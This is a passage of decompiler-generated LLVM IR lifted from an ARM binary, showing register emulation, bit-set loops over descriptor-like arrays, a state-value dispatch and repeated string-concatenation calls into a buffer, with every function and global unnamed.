  store i32 %v10_82f0, i32* @lr, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
  store i32 %v2_865c, i32* %r3.global-to-local, align 4
  %v0_8660 = load i32, i32* @r6, align 4
  %v1_8660 = add i32 %v0_8660, -1452
  %v2_8660 = inttoptr i32 %v1_8660 to i32*
  %v3_8660 = load i32, i32* %v2_8660, align 4
  store i32 %v3_8660, i32* @r0, align 4
  %v0_8664 = load i32, i32* @r5, align 4
  store i32 %v0_8664, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-44, align 4
  store i32 8, i32* @r2, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_8674, i32* %r3.global-to-local, align 4
  %v5_867c = call i32 @function_14b30(i32 %v3_8660, i32 %v0_8664, i32 8, i32 %v2_8674, i32 4)
  store i32 %v5_867c, i32* %r0.global-to-local, align 4
  %v0_8680 = load i32, i32* @r6, align 4
  %v1_8680 = add i32 %v0_8680, -1436
  %v2_8680 = inttoptr i32 %v1_8680 to i32*
  %v3_8680 = load i32, i32* %v2_8680, align 4
  store i32 %v3_8680, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 %v2_865c, i32* %r2.global-to-local, align 4
  store i32 2, i32* @r4, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %v3_828c, i32* %r0.global-to-local, align 4
  %v1_869c = call i32 @function_14898(i32 %v3_828c)
  store i32 %v1_869c, i32* %r0.global-to-local, align 4
  store i32 %v2_865c, i32* %r3.global-to-local, align 4
  %v0_86a8 = load i32, i32* @r4, align 4
  %v1_86a8 = trunc i32 %v0_86a8 to i8
  %v2_86a8 = load i32, i32* @r6, align 4
  %v3_86a8 = add i32 %v2_86a8, -1448
  %v4_86a8 = inttoptr i32 %v3_86a8 to i8*
  store i8 %v1_86a8, i8* %v4_86a8, align 1
  store i32 %v2_84f8, i32* %ip.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v1_86b8 = load i32, i32* @r6, align 4
  %v2_86b8 = add i32 %v1_86b8, -1444
  %v3_86b8 = inttoptr i32 %v2_86b8 to i32*
  store i32 %v2_84f8, i32* %v3_86b8, align 4
  store i32 %v2_86bc, i32* %r1.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r6, align 4
  %v1_86c0 = add i32 %v0_86c0, -1452
  %v2_86c0 = inttoptr i32 %v1_86c0 to i32*
  %v3_86c0 = load i32, i32* %v2_86c0, align 4
  store i32 %v3_86c0, i32* %r0.global-to-local, align 4
  %v3_86c4 = call i32 @function_147e4(i32 %v3_86c0, i32 %v2_86bc, i32 16)
  store i32 %v3_86c4, i32* %r0.global-to-local, align 4
  %v0_86c8 = load i32, i32* @r6, align 4
  %v1_86c8 = add i32 %v0_86c8, -1452
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  %v3_86c8 = load i32, i32* %v2_86c8, align 4
  store i32 %v3_86c8, i32* %ip.global-to-local, align 4
  %v3_86d0 = udiv i32 %v3_86c8, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_86d4 = mul nuw nsw i32 %v3_86d0, 4
  store i32 %v3_86d4, i32* %r2.global-to-local, align 4
  store i32 %v2_86d8, i32* @lr, align 4
  br label %dec_label_pc_86e0

dec_label_pc_86e0:                                ; preds = %dec_label_pc_8cc8, %dec_label_pc_8634
  %v0_86f0 = phi i32 [ %v3_86c8, %dec_label_pc_8634 ], [ %v3_8cc8, %dec_label_pc_8cc8 ]
  %v3_86d4.pn = phi i32 [ %v3_86d4, %dec_label_pc_8634 ], [ %v3_8cd4, %dec_label_pc_8cc8 ]
  %storemerge = add i32 %v3_86d4.pn, %v2_86d8
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_86e0 = add i32 %storemerge, -292
  %v2_86e0 = inttoptr i32 %v1_86e0 to i32*
  %v3_86e0 = load i32, i32* %v2_86e0, align 4
  %v1_86e4 = urem i32 %v0_86f0, 32
  store i32 %v1_86e4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_86ec = shl i32 1, %v1_86e4
  %v8_86ec = or i32 %v3_86e0, %v7_86ec
  store i32 %v8_86ec, i32* %r1.global-to-local, align 4
  %v1_86f0 = load i32, i32* @r8, align 4
  %v2_86f0 = sub i32 %v0_86f0, %v1_86f0
  %v3_86f0 = icmp uge i32 %v0_86f0, %v1_86f0
  store i1 %v3_86f0, i1* %cpsr_c.global-to-local, align 1
  %v4_86f0 = xor i32 %v1_86f0, %v0_86f0
  %v5_86f0 = xor i32 %v2_86f0, %v0_86f0
  %v6_86f0 = and i32 %v5_86f0, %v4_86f0
  %v7_86f0 = icmp slt i32 %v6_86f0, 0
  %v8_86f0 = icmp slt i32 %v2_86f0, 0
  %v9_86f0 = icmp eq i32 %v0_86f0, %v1_86f0
  store i1 %v9_86f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_86ec, i32* %v2_86e0, align 4
  %v3_86f8 = xor i1 %v8_86f0, %v7_86f0
  %v4_86f8 = or i1 %v9_86f0, %v3_86f8
  br i1 %v4_86f8, label %dec_label_pc_85bc, label %dec_label_pc_86fc

dec_label_pc_86fc:                                ; preds = %dec_label_pc_86e0
  %v0_86fc = load i32, i32* %ip.global-to-local, align 4
  %v1_86fc = load i32, i32* %r3.global-to-local, align 4
  %v2_86fc = add i32 %v1_86fc, %v0_86fc
  store i32 %v2_86fc, i32* @r8, align 4
  br label %dec_label_pc_8700

dec_label_pc_8700:                                ; preds = %dec_label_pc_8d80, %dec_label_pc_900c, %dec_label_pc_8fb8, %dec_label_pc_86fc
  %v0_871860 = phi i32 [ %v2_8d80, %dec_label_pc_8d80 ], [ %v2_900c, %dec_label_pc_900c ], [ %v2_8fb8, %dec_label_pc_8fb8 ], [ %v2_86fc, %dec_label_pc_86fc ]
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_8704 = load i32, i32* @r7, align 4
  %v1_8704 = add i32 %v0_8704, 1
  store i32 %v1_8704, i32* @r7, align 4
  %v0_8708 = load i32, i32* @r6, align 4
  %v3_870c = icmp uge i32 %v1_8704, %v0_839c
  store i1 %v3_870c, i1* %cpsr_c.global-to-local, align 1
  %v9_870c = icmp eq i32 %v1_8704, %v0_839c
  store i1 %v9_870c, i1* %cpsr_z.global-to-local, align 1
  %v1_8710 = add i32 %v0_8708, 3140
  store i32 %v1_8710, i32* @r6, align 4
  br i1 %v9_870c, label %dec_label_pc_8718, label %dec_label_pc_85d4

dec_label_pc_8718:                                ; preds = %dec_label_pc_8700, %dec_label_pc_85bc.dec_label_pc_8718_crit_edge
  %v0_8750 = phi i32 [ %v0_8718.pre, %dec_label_pc_85bc.dec_label_pc_8718_crit_edge ], [ %v0_871860, %dec_label_pc_8700 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8718 = icmp eq i32 %v0_8750, 0
  store i1 %v2_8718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8718, label %dec_label_pc_84f4, label %dec_label_pc_8720

dec_label_pc_8720:                                ; preds = %dec_label_pc_8718
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-60, align 4
  store i32 %v2_8740, i32* %ip.global-to-local, align 4
  store i32 %v2_8744, i32* %r1.global-to-local, align 4
  store i32 %v2_8748, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_8750, i32* %r0.global-to-local, align 4
  %v5_8758 = call i32 @function_14d24(i32 %v0_8750, i32 %v2_8744, i32 %v2_8748, i32 0, i32 %v2_8740)
  store i32 %v5_8758, i32* @r4, align 4
  %v0_8760 = load i32, i32* @r5, align 4
  store i32 %v0_8760, i32* %r0.global-to-local, align 4
  %v1_8764 = inttoptr i32 %v0_8760 to i32*
  %v2_8764 = call i32 @function_15b1c(i32* %v1_8764)
  store i32 %v2_8764, i32* %r0.global-to-local, align 4
  %v0_8768 = load i32, i32* @r4, align 4
  %v1_8768 = load i32, i32* @r5, align 4
  %v3_8768 = icmp uge i32 %v0_8768, %v1_8768
  store i1 %v3_8768, i1* %cpsr_c.global-to-local, align 1
  %v9_8768 = icmp eq i32 %v0_8768, %v1_8768
  store i1 %v9_8768, i1* %cpsr_z.global-to-local, align 1
  %v7_8770 = icmp sgt i32 %v0_8768, %v1_8768
  br i1 %v7_8770, label %dec_label_pc_8774, label %dec_label_pc_84f4

dec_label_pc_8774:                                ; preds = %dec_label_pc_8720
  %v0_87d4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_87d4

dec_label_pc_877c:                                ; preds = %dec_label_pc_87e8, %dec_label_pc_8854
  %v1_878c = phi i32 [ %v1_8800, %dec_label_pc_87e8 ], [ %v1_878c.pre, %dec_label_pc_8854 ]
  %v0_8784 = phi i32 [ %v3_87f0, %dec_label_pc_87e8 ], [ %v0_8784.pre, %dec_label_pc_8854 ]
  store i32 %v2_86d8, i32* %r3.global-to-local, align 4
  %v2_8784 = add i32 %v0_8784, %v2_86d8
  store i32 %v2_8784, i32* %r2.global-to-local, align 4
  %v1_8788 = add i32 %v2_8784, -164
  %v2_8788 = inttoptr i32 %v1_8788 to i32*
  %v3_8788 = load i32, i32* %v2_8788, align 4
  %v2_878c = add i32 %v1_878c, -1
  %v3_878c = shl i32 1, %v2_878c
  %v4_878c = and i32 %v3_8788, %v3_878c
  %v5_878c = icmp ne i32 %v4_878c, 0
  store i1 %v5_878c, i1* %cpsr_c.global-to-local, align 1
  %v6_878c = lshr i32 %v3_8788, %v1_878c
  store i32 %v6_878c, i32* %r3.global-to-local, align 4
  %v1_8790 = urem i32 %v6_878c, 2
  %v2_8790 = icmp eq i32 %v1_8790, 0
  store i1 %v2_8790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8790, label %dec_label_pc_87b4, label %dec_label_pc_8798

dec_label_pc_8798:                                ; preds = %dec_label_pc_877c
  %v0_8798 = load i32, i32* @sl, align 4
  %v1_8798 = add i32 %v0_8798, -1448
  %v2_8798 = inttoptr i32 %v1_8798 to i8*
  %v3_8798 = load i8, i8* %v2_8798, align 1
  %v4_8798 = zext i8 %v3_8798 to i32
  store i32 %v4_8798, i32* %r3.global-to-local, align 4
  %v2_879c = icmp ugt i8 %v3_8798, 5
  store i1 %v2_879c, i1* %cpsr_c.global-to-local, align 1
  %v7_879c = icmp eq i8 %v3_8798, 6
  store i1 %v7_879c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_879c, label %dec_label_pc_9054, label %dec_label_pc_87a4

dec_label_pc_87a4:                                ; preds = %dec_label_pc_8798
  %v2_87a4 = icmp ugt i8 %v3_8798, 6
  store i1 %v2_87a4, i1* %cpsr_c.global-to-local, align 1
  %v7_87a4 = icmp eq i8 %v3_8798, 7
  store i1 %v7_87a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87a4, label %dec_label_pc_8d88, label %dec_label_pc_87ac

dec_label_pc_87ac:                                ; preds = %dec_label_pc_87a4
  %v2_87ac = icmp ugt i8 %v3_8798, 9
  store i1 %v2_87ac, i1* %cpsr_c.global-to-local, align 1
  %v7_87ac = icmp eq i8 %v3_8798, 10
  store i1 %v7_87ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87ac, label %dec_label_pc_8ce4, label %dec_label_pc_87b4

dec_label_pc_87b4:                                ; preds = %dec_label_pc_8e84, %dec_label_pc_95ac, %dec_label_pc_959c, %dec_label_pc_8d34, %dec_label_pc_87ac, %dec_label_pc_877c, %dec_label_pc_87d4, %dec_label_pc_90a4, %dec_label_pc_9b54, %dec_label_pc_9a00, %dec_label_pc_9978, %dec_label_pc_991c, %dec_label_pc_9704, %dec_label_pc_95bc, %dec_label_pc_8d40, %dec_label_pc_8fc0
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_87bc = add i32 %stack_var_-20824.0, 1
  store i32 %v1_87bc, i32* %r2.global-to-local, align 4
  %v0_87c0 = load i32, i32* @sl, align 4
  %v3_87c4 = icmp uge i32 %v1_87bc, %v0_839c
  store i1 %v3_87c4, i1* %cpsr_c.global-to-local, align 1
  %v9_87c4 = icmp eq i32 %v1_87bc, %v0_839c
  store i1 %v9_87c4, i1* %cpsr_z.global-to-local, align 1
  %v1_87cc = add i32 %v0_87c0, 3140
  store i32 %v1_87cc, i32* @sl, align 4
  br i1 %v9_87c4, label %dec_label_pc_84f4, label %dec_label_pc_87d4

dec_label_pc_87d4:                                ; preds = %dec_label_pc_87b4, %dec_label_pc_8774
  %stack_var_-20824.0 = phi i32 [ %v1_8768, %dec_label_pc_8774 ], [ %v1_87bc, %dec_label_pc_87b4 ]
  %v0_87d4 = phi i32 [ %v0_87d4.pre, %dec_label_pc_8774 ], [ %v1_87cc, %dec_label_pc_87b4 ]
  %v1_87d4 = add i32 %v0_87d4, -1452
  %v2_87d4 = inttoptr i32 %v1_87d4 to i32*
  %v3_87d4 = load i32, i32* %v2_87d4, align 4
  store i32 %v3_87d4, i32* %r0.global-to-local, align 4
  %v2_87dc = icmp eq i32 %v3_87d4, -1
  store i1 %v2_87dc, i1* %cpsr_c.global-to-local, align 1
  %v7_87dc = icmp eq i32 %v3_87d4, -1
  store i1 %v7_87dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_87d4, i32* @sb, align 4
  br i1 %v7_87dc, label %dec_label_pc_87b4, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87d4
  %v3_87e8 = udiv i32 %v3_87d4, 32
  %v3_87f0 = mul nuw nsw i32 %v3_87e8, 4
  store i32 %v3_87f0, i32* %ip.global-to-local, align 4
  store i32 %v2_86d8, i32* @lr, align 4
  %v2_87f8 = add i32 %v3_87f0, %v2_86d8
  store i32 %v2_87f8, i32* %r2.global-to-local, align 4
  %v1_87fc = add i32 %v2_87f8, -292
  %v2_87fc = inttoptr i32 %v1_87fc to i32*
  %v3_87fc = load i32, i32* %v2_87fc, align 4
  %v1_8800 = urem i32 %v3_87d4, 32
  store i32 %v1_8800, i32* %r1.global-to-local, align 4
  %v2_8804 = add nsw i32 %v1_8800, -1
  %v3_8804 = shl i32 1, %v2_8804
  %v4_8804 = and i32 %v3_87fc, %v3_8804
  %v5_8804 = icmp ne i32 %v4_8804, 0
  store i1 %v5_8804, i1* %cpsr_c.global-to-local, align 1
  %v6_8804 = lshr i32 %v3_87fc, %v1_8800
  store i32 %v6_8804, i32* %r3.global-to-local, align 4
  %v1_8808 = urem i32 %v6_8804, 2
  %v2_8808 = icmp eq i32 %v1_8808, 0
  store i1 %v2_8808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8808, label %dec_label_pc_877c, label %dec_label_pc_8810

dec_label_pc_8810:                                ; preds = %dec_label_pc_87e8
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_8828, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 4, i32* %stack_var_-52, align 4
  store i32 %v2_8834, i32* @lr, align 4
  store i32 4, i32* @r2, align 4
  %v5_8840 = call i32 @function_14850(i32 %v3_87d4, i32 1, i32 4, i32 %v2_8828, i32 %v2_8834)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8848 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_8848, i32* %r3.global-to-local, align 4
  %v2_884c = or i32 %v3_8848, %v5_8840
  store i32 %v2_884c, i32* %r0.global-to-local, align 4
  %v4_884c = icmp eq i32 %v2_884c, 0
  store i1 %v4_884c, i1* %cpsr_z.global-to-local, align 1
  %v0_8854 = load i32, i32* @sl, align 4
  %v1_8854 = add i32 %v0_8854, -1452
  %v2_8854 = inttoptr i32 %v1_8854 to i32*
  %v3_8854 = load i32, i32* %v2_8854, align 4
  br i1 %v4_884c, label %dec_label_pc_8854, label %dec_label_pc_8fc0

dec_label_pc_8854:                                ; preds = %dec_label_pc_8810
  store i32 %v3_8854, i32* %r3.global-to-local, align 4
  %v3_8858 = udiv i32 %v3_8854, 32
  store i32 %v3_8858, i32* %r2.global-to-local, align 4
  %v1_885c = urem i32 %v3_8854, 32
  store i32 %v1_885c, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8860 = mul nuw nsw i32 %v3_8858, 4
  store i32 %v3_8860, i32* %ip.global-to-local, align 4
  %v0_8864 = load i32, i32* @r4, align 4
  %v1_8864 = trunc i32 %v0_8864 to i8
  %v3_8864 = add i32 %v0_8854, -1448
  %v4_8864 = inttoptr i32 %v3_8864 to i8*
  store i8 %v1_8864, i8* %v4_8864, align 1
  %v0_8784.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_878c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_877c

dec_label_pc_886c:                                ; preds = %dec_label_pc_85d4
  %v1_886c = add i32 %v3_8878, 4
  %v2_886c = inttoptr i32 %v1_886c to i32*
  %v3_886c = load i32, i32* %v2_886c, align 4
  store i32 %v3_886c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8870 = icmp eq i32 %v3_886c, 0
  store i1 %v2_8870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8870, label %.thread18, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_886c
  store i32 4, i32* %r3.global-to-local, align 4
  store i8 4, i8* %v2_85d4, align 1
  %v0_887c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_887c.pr.pr, label %.thread16..thread18_crit_edge, label %dec_label_pc_8884

.thread16..thread18_crit_edge:                    ; preds = %.thread16
  %v1_887c.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_887c.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_887c.pre to i8
  br label %.thread18

.thread18:                                        ; preds = %.thread16..thread18_crit_edge, %dec_label_pc_886c
  %v3_887c = phi i32 [ %v3_887c.pre, %.thread16..thread18_crit_edge ], [ %v3_8878, %dec_label_pc_886c ]
  %v1_887c.off0 = phi i8 [ %extract.t, %.thread16..thread18_crit_edge ], [ 0, %dec_label_pc_886c ]
  %v4_887c = add i32 %v3_887c, -1448
  %v5_887c = inttoptr i32 %v4_887c to i8*
  store i8 %v1_887c.off0, i8* %v5_887c, align 1
  %v0_8880.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8880.pr, label %.thread18.dec_label_pc_85f0_crit_edge, label %dec_label_pc_8884

.thread18.dec_label_pc_85f0_crit_edge:            ; preds = %.thread18
  %v0_85f0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_85f0

dec_label_pc_8884:                                ; preds = %.thread16, %.thread18, %dec_label_pc_857c
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_888c = load i32, i32* @r5, align 4
  %v1_888c = add i32 %v0_888c, 2112
  store i32 %v1_888c, i32* %r0.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = add i32 %v1_8890, 12
  %v3_8890 = inttoptr i32 %v2_8890 to i32*
  store i32 -1, i32* %v3_8890, align 4
  %v0_8894 = load i32, i32* %r0.global-to-local, align 4
  %v1_8894 = add i32 %v0_8894, 4
  store i32 %v1_8894, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_889c = load i32, i32* @sb, align 4
  %v1_889c = load i32, i32* @r6, align 4
  %v2_889c = inttoptr i32 %v1_889c to i32*
  store i32 %v0_889c, i32* %v2_889c, align 4
  %v2_88a0 = call i32 @function_12404(i32 %v1_8894, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_88ac = load i32, i32* @sb, align 4
  %v1_88ac = load i32, i32* @r6, align 4
  %v2_88ac = add i32 %v1_88ac, 660
  %v3_88ac = inttoptr i32 %v2_88ac to i32*
  store i32 %v0_88ac, i32* %v3_88ac, align 4
  %v2_88b0 = call i32 @function_12404(i32 %stack_var_-20860.0.ph, i32 10240)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88b8 = call i32 @function_12370(i8* %v1_88b8)
  %v0_88bc = load i32, i32* @r5, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_88c4 = add i32 %v0_88bc, 1431
  store i32 %v1_88c4, i32* @fp, align 4
  %v2_88c8 = add i32 %v2_88b8, %stack_var_-20860.0.ph
  store i32 %v2_88c8, i32* @r0, align 4
  store i32 %v1_88c4, i32* %r1.global-to-local, align 4
  %v2_88d0 = inttoptr i32 %v2_88c8 to i8*
  %v3_88d0 = call i32 @function_12398(i8* %v2_88d0, i32 %v1_88c4)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88d8 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_197c4.26 to i32), i32* %r1.global-to-local, align 4
  %v2_88e4 = add i32 %v2_88d8, %stack_var_-20860.0.ph
  store i32 %v2_88e4, i32* @r0, align 4
  %v2_88e8 = inttoptr i32 %v2_88e4 to i8*
  %v3_88e8 = call i32 @function_12398(i8* %v2_88e8, i32 ptrtoint (i32* @global_var_197c4.26 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88f0 = call i32 @function_12370(i8* %v1_88b8)
  %v2_88f8 = add i32 %v2_88f0, %stack_var_-20860.0.ph
  store i32 %v2_88f8, i32* @r0, align 4
  %v0_88fc = load i32, i32* @r5, align 4
  %v1_88fc = add i32 %v0_88fc, 532
  store i32 %v1_88fc, i32* %r1.global-to-local, align 4
  %v2_8900 = inttoptr i32 %v2_88f8 to i8*
  %v3_8900 = call i32 @function_12398(i8* %v2_8900, i32 %v1_88fc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8908 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1979c.28 to i32), i32* %r1.global-to-local, align 4
  %v2_8914 = add i32 %v2_8908, %stack_var_-20860.0.ph
  store i32 %v2_8914, i32* @r0, align 4
  %v3_8918 = inttoptr i32 %v2_8914 to i8*
  %v4_8918 = call i32 @function_12398(i8* %v3_8918, i32 ptrtoint ([24 x i8]* @global_var_1979c.28 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8920 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  %v0_8928 = load i32, i32* @r5, align 4
  %v1_8928 = add i32 %v0_8928, 20
  store i32 %v1_8928, i32* %r1.global-to-local, align 4
  %v2_892c = add i32 %v2_8920, %stack_var_-20860.0.ph
  store i32 %v2_892c, i32* @r0, align 4
  %v2_8930 = inttoptr i32 %v2_892c to i8*
  %v3_8930 = call i32 @function_12398(i8* %v2_8930, i32 %v1_8928)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8938 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_197b4.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8944 = add i32 %v2_8938, %stack_var_-20860.0.ph
  store i32 %v2_8944, i32* @r0, align 4
  %v3_8948 = inttoptr i32 %v2_8944 to i8*
  %v4_8948 = call i32 @function_12398(i8* %v3_8948, i32 ptrtoint ([9 x i8]* @global_var_197b4.30 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8950 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  %v0_8958 = load i32, i32* @r5, align 4
  %v2_895c = add i32 %v2_8950, %stack_var_-20860.0.ph
  store i32 %v2_895c, i32* @r0, align 4
  %v1_8960 = add i32 %v0_8958, 789
  store i32 %v1_8960, i32* %r1.global-to-local, align 4
  %v2_8964 = inttoptr i32 %v2_895c to i8*
  %v3_8964 = call i32 @function_12398(i8* %v2_8964, i32 %v1_8960)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_896c = call i32 @function_12370(i8* %v1_88b8)
  %v2_8974 = add i32 %v2_896c, %stack_var_-20860.0.ph
  store i32 %v2_8974, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r1.global-to-local, align 4
  %v3_897c = inttoptr i32 %v2_8974 to i8*
  %v4_897c = call i32 @function_12398(i8* %v3_897c, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_8984 = call i32 @function_11ad8(i32 32)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_898c = call i32 @function_12370(i8* %v1_88b8)
  %v0_8990 = load i32, i32* @sb, align 4
  store i32 %v0_8990, i32* %r1.global-to-local, align 4
  store i32 %v2_898c, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_899c = inttoptr i32 %v0_8990 to i32*
  %v3_899c = call i32 @function_11a14(i32 32, i32* %v2_899c)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_899c, i32* %r1.global-to-local, align 4
  %v1_89a8 = load i32, i32* @r4, align 4
  %v2_89a8 = add i32 %v1_89a8, %stack_var_-20860.0.ph
  store i32 %v2_89a8, i32* @r0, align 4
  %v2_89ac = inttoptr i32 %v2_89a8 to i8*
  %v3_89ac = call i32 @function_12398(i8* %v2_89ac, i32 %v3_899c)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_89b4 = call i32 @function_11a38(i32 32)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89bc = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r1.global-to-local, align 4
  %v2_89c8 = add i32 %v2_89bc, %stack_var_-20860.0.ph
  store i32 %v2_89c8, i32* @r0, align 4
  %v3_89cc = inttoptr i32 %v2_89c8 to i8*
  %v4_89cc = call i32 @function_12398(i8* %v3_89cc, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_89d4 = call i32 @function_11ad8(i32 33)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89dc = call i32 @function_12370(i8* %v1_88b8)
  %v0_89e0 = load i32, i32* @sb, align 4
  store i32 %v0_89e0, i32* %r1.global-to-local, align 4
  store i32 %v2_89dc, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_89ec = inttoptr i32 %v0_89e0 to i32*
  %v3_89ec = call i32 @function_11a14(i32 33, i32* %v2_89ec)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_89ec, i32* %r1.global-to-local, align 4
  %v1_89f8 = load i32, i32* @r4, align 4
  %v2_89f8 = add i32 %v1_89f8, %stack_var_-20860.0.ph
  store i32 %v2_89f8, i32* @r0, align 4
  %v2_89fc = inttoptr i32 %v2_89f8 to i8*
  %v3_89fc = call i32 @function_12398(i8* %v2_89fc, i32 %v3_89ec)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_8a04 = call i32 @function_11a38(i32 33)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a0c = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r1.global-to-local, align 4
  %v2_8a18 = add i32 %v2_8a0c, %stack_var_-20860.0.ph
  store i32 %v2_8a18, i32* @r0, align 4
  %v3_8a1c = inttoptr i32 %v2_8a18 to i8*
  %v4_8a1c = call i32 @function_12398(i8* %v3_8a1c, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8a24 = call i32 @function_11ad8(i32 34)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a2c = call i32 @function_12370(i8* %v1_88b8)
  %v0_8a30 = load i32, i32* @sb, align 4
  store i32 %v0_8a30, i32* %r1.global-to-local, align 4
  store i32 %v2_8a2c, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_8a3c = inttoptr i32 %v0_8a30 to i32*
  %v3_8a3c = call i32 @function_11a14(i32 34, i32* %v2_8a3c)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8a3c, i32* %r1.global-to-local, align 4
  %v1_8a48 = load i32, i32* @r4, align 4
  %v2_8a48 = add i32 %v1_8a48, %stack_var_-20860.0.ph
  store i32 %v2_8a48, i32* @r0, align 4
  %v2_8a4c = inttoptr i32 %v2_8a48 to i8*
  %v3_8a4c = call i32 @function_12398(i8* %v2_8a4c, i32 %v3_8a3c)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8a54 = call i32 @function_11a38(i32 34)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
